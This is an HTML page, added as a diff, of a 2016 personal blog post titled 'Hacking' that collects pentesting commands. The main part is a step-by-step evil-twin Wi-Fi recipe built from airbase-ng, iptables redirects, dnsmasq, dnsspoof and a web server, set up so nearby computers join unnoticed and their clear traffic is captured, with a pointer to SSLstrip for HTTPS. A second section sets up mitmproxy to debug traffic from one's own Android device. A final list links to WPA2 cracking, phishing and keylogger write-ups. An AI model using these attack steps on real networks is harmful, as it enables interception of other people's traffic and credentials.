@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="author" content="Romain Pellerin" />
+        <meta name="keywords" content="romain pellerin, romain, pellerin, portfolio, site personnel, personal website, blog, hacking, kali, security, android, mitm, linux" />
+        <meta name="geo.placename" content="San Francisco, California, USA" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="all" />
+        <link rel="stylesheet" href="//romainpellerin.eu/theme/css/main.css" type="text/css" />
+        <link rel="shortcut icon" href="//romainpellerin.eu/favicon.ico" />
+
+        <script>
+        function _dntEnabled(dnt, userAgent) {
+            'use strict';
+
+            // for old version of IE we need to use the msDoNotTrack property of navigator
+            // on newer versions, and newer platforms, this is doNotTrack but, on the window object
+            // Safari also exposes the property on the window object.
+            var dntStatus = dnt || navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+            var ua = userAgent || navigator.userAgent;
+
+            // List of Windows versions known to not implement DNT according to the standard.
+            var anomalousWinVersions = ['Windows NT 6.1', 'Windows NT 6.2', 'Windows NT 6.3'];
+
+            var fxMatch = ua.match(/Firefox\/(\d+)/);
+            var ieRegEx = /MSIE|Trident/i;
+            var isIE = ieRegEx.test(ua);
+            // Matches from Windows up to the first occurance of ; un-greedily
+            // http://www.regexr.com/3c2el
+            var platform = ua.match(/Windows.+?(?=;)/g);
+
+            // With old versions of IE, DNT did not exist so we simply return false;
+            if (isIE && typeof Array.prototype.indexOf !== 'function') {
+                return false;
+            } else if (fxMatch && parseInt(fxMatch[1], 10) < 32) {
+                // Can't say for sure if it is 1 or 0, due to Fx bug 887703
+                dntStatus = 'Unspecified';
+            } else if (isIE && platform && anomalousWinVersions.indexOf(platform.toString()) !== -1) {
+                // default is on, which does not honor the specification
+                dntStatus = 'Unspecified';
+            } else {
+                // sets dntStatus to Disabled or Enabled based on the value returned by the browser.
+                // If dntStatus is undefined, it will be set to Unspecified
+                dntStatus = { '0': 'Disabled', '1': 'Enabled' }[dntStatus] || 'Unspecified';
+            }
+            return dntStatus === 'Enabled' ? true : false;
+        }
+        if (!_dntEnabled()) {
+            // If user has enabed Do Not Track, Google Analytics is not loaded.
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+            ga('create', 'UA-39228475-3', 'auto');
+            ga('send', 'pageview');
+        }
+        </script>
+
+        <!-- Social media -->
+        <meta name="twitter:card" content="summary" />
+        <meta name="twitter:site" content="@romainpellerin" />
+        <meta name="description" content="A handful of useful commands about hacking" />
+        <meta property="og:image" name="twitter:image" content="//romainpellerin.eu/theme/img/romain_pellerin-1x.jpg" />
+        <meta property="og:title" name="twitter:title" content="Hacking - Romain Pellerin's Blog" />
+        <meta property="og:description" name="twitter:description" content="A handful of useful commands about hacking" />
+
+        <title>Hacking - Romain Pellerin's Blog</title>
+
+        <link href="//romainpellerin.eu/feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Romain Pellerin's Blog Atom Feed" />
+        <link href="//romainpellerin.eu/feeds/rss.xml" type="application/rss+xml" rel="alternate" title="Romain Pellerin's Blog RSS Feed" />
+    </head>
+    <body>
+        <div id="wrapper">
+
+<nav class="flexbox-row">
+    <a class="center" href="//romainpellerin.eu/">Homepage</a>
+    <span class="center">|| Blog:</span>
+    <a class="center" href="//romainpellerin.eu/archives.html">Archives (all posts)</a>
+    <a class="center" href="//romainpellerin.eu/categories.html">Categories</a>
+    <a class="center" href="//romainpellerin.eu/tags.html">Tags</a>
+    <a class="center" href="//romainpellerin.eu/feeds/rss.xml">RSS feed</a>
+    <a class="center" href="//romainpellerin.eu/feeds/atom.xml">Atom feed</a>
+</nav><header class="article-header center">
+    <p id="back-line" class="small grey"><span>
+<time datetime="2016-01-18T23:00:00+01:00">Mon 18 January 2016</time>        </p>
+    <h1>Hacking</h1>
+    <div class="grey">
+        <p class="italic">A handful of useful commands about hacking</p>
+        <p class="small">
+            &#128338; <span title="Based on a 200 words per minute reading speed. This article has a total of 799 words.">4 min read</span>
+        </p>
+<p class="small">Category: <a title="Go to the category" href="//romainpellerin.eu/category/linux.html">Linux</a></p><p class="small">Tags: <a title="Go to the tag" href="//romainpellerin.eu/tag/hacking.html">hacking</a>, <a title="Go to the tag" href="//romainpellerin.eu/tag/kali.html">kali</a>, <a title="Go to the tag" href="//romainpellerin.eu/tag/security.html">security</a>, <a title="Go to the tag" href="//romainpellerin.eu/tag/android.html">android</a>, <a title="Go to the tag" href="//romainpellerin.eu/tag/mitm.html">mitm</a>, <a title="Go to the tag" href="//romainpellerin.eu/tag/linux.html">linux</a></p>    </div>
+</header>
+<article>
+    <p>This brief article solely contains a few lines of commands, to perform pentesting or network monitoring. It's basically something I might use in the future on my networks or apps, so I'm writing it down as a reminder. I thought it may help other people that's why I decided to put it online. Of course the preferred operating system is <a href="https://www.kali.org/">Kali</a> (or any Debian-based distro).</p>
+<p><strong>WARNING: only for use on your own networks and devices, the law strictly forbids it otherwise.</strong></p>
+<h1>Fake AP (access point)</h1>
+<p>This technique is about creating a fake access point, similar to one already existing, so that people's computers will try to connect to your fake AP automatically, without them noticing.</p>
+<ol>
+<li>Deactivate any firewall first</li>
+<li>
+<p>Get super user rights</p>
+<div class="highlight"><pre><span></span>sudo su
+</pre></div>
+
+
+</li>
+<li>
+<p>Install some required packages if not already present</p>
+<div class="highlight"><pre><span></span>aptitude install dnsmasq aircrack-ng
+</pre></div>
+
+
+</li>
+<li>
+<p>List the existing network interfaces and turn one of them into monitor mode</p>
+<div class="highlight"><pre><span></span>airmon-ng
+airmon-ng start wlan0 <span class="c1"># wlan0 is usually Wifi</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>Start monitoring available networks around, and make a quick test</p>
+<div class="highlight"><pre><span></span>airodump-ng mon0
+aireplay-ng --test mon0 <span class="c1"># Test</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>Choose one network and fake it</p>
+<div class="highlight"><pre><span></span>airbase-ng --essid <span class="s1">&#39;HG655D-1BFF19&#39;</span> -c <span class="m">7</span> -W <span class="m">1</span> -Z <span class="m">2</span> -v mon0 <span class="c1"># Fake WPA AP</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>Enable packet forwarding</p>
+<div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port <span class="m">80</span> -j REDIRECT --to-port <span class="m">8080</span>
+iptables -t nat -A PREROUTING -p tcp --destination-port <span class="m">443</span> -j REDIRECT --to-port <span class="m">8080</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>Write what follows in <code>/etc/dnsmasq.conf</code>:</p>
+<div class="highlight"><pre><span></span>interface=at0
+dhcp-range=192.168.0.50,192.168.0.150,12h
+</pre></div>
+
+
+</li>
+<li>
+<p>Do some other things for which I can't recall the usefulness right now (but I promise to update the article as soon as I do):</p>
+<div class="highlight"><pre><span></span>ifconfig at0 <span class="m">192</span>.168.0.1 up
+dnsmasq <span class="c1"># pkill dnsmasq if needed</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>Write what follows in <code>/tmp/tests.conf</code> (<code>&lt;tab&gt;</code> means you have to hit the tab key):</p>
+<div class="highlight"><pre><span></span><span class="m">192</span>.168.0.1&lt;tab&gt;*
+</pre></div>
+
+
+</li>
+<li>
+<p>Run <code>dnsspoof</code>:</p>
+<div class="highlight"><pre><span></span>dnsspoof -i wlan0 -f /tmp/tests.conf
+</pre></div>
+
+
+</li>
+<li>
+<p>Finally, start a webserver (Apache or using Python, or whatever)</p>
+<div class="highlight"><pre><span></span>python3 -m http.server <span class="m">8080</span>
+</pre></div>
+
+
+</li>
+</ol>
+<p>And you're good! All the clear traffic will pop up right in front of your eyes. To deal with HTTPS connections, have a look at <a href="http://www.thoughtcrime.org/software/sslstrip/">SSLstrip</a>.</p>
+<p>Encountering problems with DNSspoof? <a href="https://forums.hak5.org/index.php?/topic/29166-dnsspoof-problem/">Have a look there.</a></p>
+<p><a href="http://www.backtrack-linux.org/forums/showthread.php?t=61240">More information about faking APs.</a></p>
+<p><a href="https://www.offensive-security.com/kali-linux/kali-linux-evil-wireless-access-point/">Another interesting tutorial ("Kali Linux Evil Wireless Access Point").</a></p>
+<h1>MITM</h1>
+<p>This is a commonly used technique to "put yourself" between a target user and an access point, in order to see all the traffic this user might send and receive.</p>
+<h2>MITM on Android</h2>
+<p>On Android, it has the advantage of allowing you to monitor your outcoming traffic, which is useful when debugging your own apps.</p>
+<ol>
+<li>
+<p>Grant yourself super user rights and enable packet forwarding on the right interface (here <code>eth0</code> which is the Ethernet connection):</p>
+<div class="highlight"><pre><span></span>sudo su
+sysctl -w net.ipv4.ip_forward<span class="o">=</span><span class="m">1</span>
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport <span class="m">80</span> -j REDIRECT --to-port <span class="m">8080</span>
+iptables -t nat -A PREROUTING -i eth0 -p tcp --dport <span class="m">443</span> -j REDIRECT --to-port <span class="m">8080</span>
+</pre></div>
+
+
+</li>
+<li>
+<p>Install the required dependencies and mitmproxy:</p>
+<div class="highlight"><pre><span></span>apt-get install python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg8-dev zlib1g-dev
+easy_install mitmproxy
+</pre></div>
+
+
+<p>You can as well <a href="http://docs.mitmproxy.org/en/stable/install.html#installation-on-ubuntu">download mitmproxy and install it manually</a>.</p>
+</li>
+<li>
+<p>Run it:</p>
+<div class="highlight"><pre><span></span>mitmproxy -T --no-upstream-cert --host <span class="o">[</span>-p <span class="m">8080</span><span class="o">]</span> <span class="c1"># -p is optional as 8080 is the default port</span>
+</pre></div>
+
+
+<p>The argument <code>-T</code> is for <em>transparent</em>. If you don't go for transparent, then the 3 lines about packet forwarding (point 1.) are useless (or maybe not, I can't remember).</p>
+</li>
+<li>
+<p>On your Android device:</p>
+<ol>
+<li>Open the current Wifi settings (long-press on the connected network).<ul>
+<li>If you decided to do transparent proxying (see above), set proxy to your computer's IP and port 8080, like: <code>192.168.1.2:8080</code></li>
+<li>If you decided not to do transparent proxying (see above), don't set the proxy and instead set the IP to be static rather than using DHCP. Then write your computer's IP as the gateway.</li>
+</ul>
+</li>
+<li>Go to the website <a href="http://mitm.it">mitm.it</a> and click on the Android icon to install the certificate. If this doesn't work (website unreachable), push the certificate manually from your computer (run the following command from your computer):<div class="highlight"><pre><span></span>adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/Download
+</pre></div>
+
+
+</li>
+</ol>
+</li>
+</ol>
+<p>Then you'll see the traffic in your terminal going through!</p>
+<p>This part has been inspired from <a href="https://medium.com/@rotxed/how-to-debug-http-s-traffic-on-android-7fbe5d2a34">this article</a>.</p>
+<h1>Other tools</h1>
+<ul>
+<li><a href="https://github.com/xdavidhu/mitmAP">mitmAP - A python program, to create a fake AP, and sniff data</a></li>
+</ul>
+<h1>Other related topics</h1>
+<ul>
+<li><a href="http://www.gvrachliotis.net/2013/10/how-to-reset-user-password-in-windows.html">How to: Reset user password in Windows 7/8/8.1</a></li>
+<li><a href="https://www.nolimitsecu.fr/les-denis-de-service/">Les dénies de services</a></li>
+<li><a href="http://korben.info/wifi-ouvert-attention-aux-faux-hotspot-demo-module-arduino.html">Wifi ouvert – Attention aux faux hotspot ! (+ une démo avec un module Arduino)</a></li>
+<li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/How-I-Cracked-a-Keylogger-and-Ended-Up-in-Someone-s-Inbox/">How I Cracked a Keylogger and Ended Up in Someone's Inbox</a></li>
+<li><a href="https://defaultnamehere.tumblr.com/post/147747146865/stalking-your-facebook-friends-on-tinder">Stalking your Facebook friends on Tinder</a></li>
+<li><a href="https://blog.secureideas.com/2013/05/professionally-evil-this-is-not.html">Professionally Evil: This is NOT the Wireless Access Point You are Looking For</a></li>
+<li><a href="http://phreaklets.blogspot.kr/2013/06/cracking-wireless-networks-protected.html?m=1">Phreaklets: Cracking WPA2 Enterprise wireless networks with FreeRADIUS WPE, hostapd and asleap &amp; John the Ripper</a></li>
+<li><a href="http://www.guiguishow.info/2016/10/12/tp-mobilite-et-reseaux-sans-fil-reseau-sans-fil-securise-et-monitore-mobilite-ipv6/">TP Mobilité et réseaux sans fil : réseau sans fil sécurisé et monitoré + mobilité IPv6</a></li>
+<li><a href="https://www.robertputt.co.uk/2016/11/28/learn-from-your-attackers-ssh-honeypot/">Learn from your attackers – SSH HoneyPot</a></li>
+<li><a href="https://medium.com/@chrismcnab/alexseys-ttps-1204d9050551">Alexsey’s TTPs</a></li>
+<li><a href="http://www.piotrbania.com/all/kon-boot/">KON-BOOT</a></li>
+<li><a href="https://korben.info/rickroller-spotify.html">Rickroller Spotify !</a></li>
+<li><a href="https://null-byte.wonderhowto.com/">Null Byte</a></li>
+<li><a href="http://www.azarask.in/blog/post/a-new-type-of-phishing-attack/">Tabnabbing: A New Type of Phishing Attack</a></li>
+<li><a href="https://mathiasbynens.github.io/rel-noopener/">About rel=noopener</a></li>
+<li><a href="https://github.com/trustedsec/social-engineer-toolkit">social-engineer-toolkit</a></li>
+<li><a href="https://mango.pdf.zone/">mango.pdf.zone</a></li>
+</ul>
+</article>
+<footer class="grey italic small">
+    Last update: Mon 18 January 2016</footer>
+
+        </div> <!-- WRAPPER -->
+    </body>
+</html>
